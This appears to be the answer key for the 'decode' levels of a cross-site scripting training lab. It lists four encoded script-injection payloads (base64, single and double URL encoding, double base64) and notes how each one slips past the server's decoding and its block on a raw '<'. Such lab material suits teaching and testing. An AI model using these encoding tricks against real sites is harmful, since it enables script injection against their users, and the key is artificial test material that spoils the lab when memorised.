# decode — solutions

Server decodes the query (base64 / URL / double) before reflection.

### decode-level1

`/decode/level1/?query=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D`

- payload: `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` (base64 of `<script>alert(1)</script>`)
- context: server base64-decodes then reflects raw

### decode-level2

`/decode/level2/?query=%253Cscript%253Ealert(1)%253C/script%253E`

- payload: `%3Cscript%3Ealert(1)%3C/script%3E`
- context: server URL-decodes once and blocks raw `<`; send URL-encoded `<` to bypass

### decode-level3

`/decode/level3/?query=%25253Cscript%25253Ealert(1)%25253C/script%25253E`

- payload: `%253Cscript%253Ealert(1)%253C/script%253E`
- context: double URL decode; raw `<` blocked after first decode, send double-encoded

### decode-level4

`/decode/level4/?query=UEhOamNtbHdkRDVoYkdWeWRDZ3hLVHd2YzJOeWFYQjBQZz09`

- payload: `UEhOamNtbHdkRDVoYkdWeWRDZ3hLVHd2YzJOeWFYQjBQZz09` (base64 of base64 of `<script>alert(1)</script>`)
- context: server applies base64 decode twice then reflects raw
